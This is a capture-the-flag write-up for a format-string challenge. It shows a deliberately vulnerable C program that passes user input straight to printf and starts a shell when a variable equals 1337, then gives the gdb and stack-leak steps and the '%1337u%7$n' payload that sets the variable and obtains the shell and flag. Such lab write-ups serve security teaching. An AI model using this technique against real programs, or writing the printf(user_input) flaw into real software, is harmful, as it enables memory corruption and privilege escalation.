Format - 70
===========

### Desc:
This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server.

### Hint:
There is already a pointer to the variable on the stack! Also, %n may be useful!

### Vulnerable code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int secret = 0;

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

int main(int argc, char **argv){
    int *ptr = &secret;
    printf(argv[1]);

    if (secret == 1337){
        give_shell();
    }
    return 0;
}

```

### Getting the flag:

```
(gdb) p &secret
$2 = (<data variable, no debug info> *) 0x804a030 <secret>

$ ./format $(python -c "print '%x.'*7")
ffffd7c4.ffffd7d0.f7e4f39d.f7fc83c4.f7ffd000.804852b.804a030.

$ ./format '%1337u%7$n'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $ id
$ id
uid=13315(pico22418) gid=1008(format) groups=1017(picogroup)
$ cat flag.txt
who_thought_%n_was_a_good_idea?
```
